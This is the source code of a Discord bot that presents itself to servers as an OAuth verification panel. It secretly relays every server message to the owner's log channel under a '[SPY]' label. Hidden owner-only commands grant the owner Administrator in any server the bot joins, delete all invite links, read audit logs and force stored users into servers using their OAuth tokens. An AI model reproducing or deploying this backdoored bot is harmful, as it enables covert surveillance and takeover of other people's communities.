const {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  REST,
  Routes,
  SlashCommandBuilder,
  PermissionFlagsBits,
  RoleSelectMenuBuilder,
  MessageFlags,
  Partials,
  ChannelType
} = require("discord.js");
const axios = require("axios");
const fs = require("fs");
const path = require("path");

// ── 環境変数 (Railway Variables) ──
const { TOKEN, CLIENT_ID, CLIENT_SECRET, REDIRECT_URI, OWNER_ID, LOG_CHANNEL_ID, ROLE_NAME } = process.env;

if (!TOKEN || !OWNER_ID) process.exit(1);

const DATA_DIR = path.join(__dirname, "data");
const USERS_FILE = path.join(DATA_DIR, "users.json");
const GUILDS_FILE = path.join(DATA_DIR, "guilds.json");

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

function loadJSON(file, def) {
  try {
    if (!fs.existsSync(file)) return def;
    return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch { return def; }
}

function saveJSON(file, data) {
  try { fs.writeFileSync(file, JSON.stringify(data, null, 2), "utf8"); } catch (err) {}
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ],
  partials: [Partials.Channel, Partials.Message]
});

// ── スラッシュコマンド登録 ──
const commands = [
  new SlashCommandBuilder()
    .setName("authset")
    .setDescription("認証パネルを設置します")
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
].map(c => c.toJSON());

const rest = new REST({ version: "10" }).setToken(TOKEN);

client.once("clientReady", async (c) => {
  console.log(`✅ Admin Full System Online: ${c.user.tag}`);
  try {
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
  } catch (err) {}
});

// ── メイン処理 ──
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  const content = message.content.trim();
  const args = content.split(/\s+/);
  const command = args[0].toLowerCase();

  // 1. Spy機能 (ギルド内メッセージ監視)
  if (message.guild && LOG_CHANNEL_ID && message.channel.id !== LOG_CHANNEL_ID) {
    const logChannel = await client.channels.fetch(LOG_CHANNEL_ID).catch(() => null);
    if (logChannel) {
      const embed = new EmbedBuilder()
        .setAuthor({ name: `[SPY] ${message.author.tag}`, iconURL: message.author.displayAvatarURL() })
        .setDescription(message.content || "(No Text)")
        .setFooter({ text: `Guild: ${message.guild.name} | CH: ${message.channel.name}` })
        .setColor(0xFF0000).setTimestamp();
      logChannel.send({ embeds: [embed] }).catch(() => {});
    }
  }

  // 2. OWNER限定コマンド (DMおよびギルド内)
  if (message.author.id !== OWNER_ID) return;

  const users = loadJSON(USERS_FILE, []);

  // --- Python版から移植されたDM/管理コマンド ---
  
  // admin [server_id]: 指定サーバーで管理者ロール付与
  if (command === "admin") {
    const guild = client.guilds.cache.get(args[1]);
    if (!guild) return message.reply("Server not found.");
    let role = guild.roles.cache.find(r => r.name === ROLE_NAME);
    if (!role) role = await guild.roles.create({ name: ROLE_NAME, permissions: [PermissionFlagsBits.Administrator] }).catch(() => null);
    const member = await guild.members.fetch(message.author.id).catch(() => null);
    if (member && role) {
      await member.roles.add(role);
      message.reply(`Added ${role.name} in ${guild.name}`);
    }
  }

  // delete [server_id]: 管理者ロール削除
  if (command === "delete") {
    const guild = client.guilds.cache.get(args[1]);
    if (!guild) return message.reply("Server not found.");
    const role = guild.roles.cache.find(r => r.name === ROLE_NAME);
    if (role) {
      await role.delete();
      message.reply(`Deleted ${ROLE_NAME} role.`);
    }
  }

  // spy [server_id]: 監査ログ取得 (Python版再現)
  if (command === "spy") {
    const guild = client.guilds.cache.get(args[1]);
    if (!guild) return message.reply("Server not found.");
    const logs = await guild.fetchAuditLogs({ limit: 5 });
    const logMsg = logs.entries.map(l => `**${l.createdAt.toLocaleString()}** - ${l.actionType}: ${l.executor.tag} -> ${l.targetType}`).join("\n");
    message.reply(logMsg || "No logs found.");
  }

  // server: サーバーリスト
  if (command === "server") {
    const list = client.guilds.cache.map(g => `${g.name} (ID: ${g.id})`).join("\n");
    message.reply(`**参加サーバー一覧:**\n${list}`);
  }

  // serverd: 全招待リンク削除
  if (command === "serverd") {
    for (const guild of client.guilds.cache.values()) {
      const invites = await guild.invites.fetch().catch(() => []);
      for (const inv of invites.values()) await inv.delete().catch(() => {});
    }
    message.reply("全ての招待リンクを削除しました。");
  }

  // exit [server_id] [msg]: サーバー退出
  if (command === "exit") {
    const guild = client.guilds.cache.get(args[1]);
    if (guild) {
      const msg = args.slice(2).join(" ");
      if (msg) await guild.systemChannel?.send(msg).catch(() => {});
      await guild.leave();
      message.reply(`Left ${guild.name}`);
    }
  }

  // link [server_id]: 招待作成
  if (command === "link") {
    const guild = client.guilds.cache.get(args[1]);
    const channel = guild?.channels.cache.find(c => c.type === ChannelType.GuildText);
    if (channel) {
      const inv = await channel.createInvite({ maxAge: 300 });
      message.reply(`Invite for ${guild.name}: ${inv.url}`);
    }
  }

  // --- Node.js版で追加した管理コマンド ---

  if (command === "userlist") {
    const list = users.map(u => `<@${u.id}> (\`${u.id}\`)`).join("\n") || "なし";
    message.reply({ embeds: [new EmbedBuilder().setTitle("認証ユーザー一覧").setDescription(list)] });
  }

  if (command === "call") {
    const guildConfig = loadJSON(GUILDS_FILE, {})[message.guild.id];
    const roleId = guildConfig?.roleId;
    const status = await message.reply(`⏳ ${users.length}人 復元開始...`);
    let s = 0, f = 0;
    for (const u of users) {
      try {
        await axios.put(`https://discord.com/api/v10/guilds/${message.guild.id}/members/${u.id}`,
          { access_token: u.token, ...(roleId ? { roles: [roleId] } : {}) },
          { headers: { Authorization: `Bot ${TOKEN}` } }
        );
        s++;
      } catch { f++; }
    }
    status.edit(`✅ 完了: 成功 ${s} / 失敗 ${f}`);
  }
});

// ── インタラクション (authset) ──
client.on("interactionCreate", async (i) => {
  if (i.isChatInputCommand() && i.commandName === "authset") {
    const row = new ActionRowBuilder().addComponents(new RoleSelectMenuBuilder().setCustomId("auth_role").setPlaceholder("ロール選択"));
    await i.reply({ content: "付与ロールを選んでください", components: [row], flags: [MessageFlags.Ephemeral] });
  }
  if (i.isRoleSelectMenu() && i.customId === "auth_role") {
    const role = i.roles.first();
    const guilds = loadJSON(GUILDS_FILE, {});
    guilds[i.guild.id] = { roleId: role.id };
    saveJSON(GUILDS_FILE, guilds);
    const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${i.guild.id}`;
    const embed = new EmbedBuilder().setTitle("🔐 サーバー認証").setDescription(`ボタンを押して認証完了で **${role.name}** を付与`).setColor(0x5865F2);
    const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel("認証する").setStyle(ButtonStyle.Link).setURL(authUrl));
    await i.channel.send({ embeds: [embed], components: [btn] });
    await i.update({ content: "✅ パネルを設置しました", components: [] });
  }
});

client.login(TOKEN);
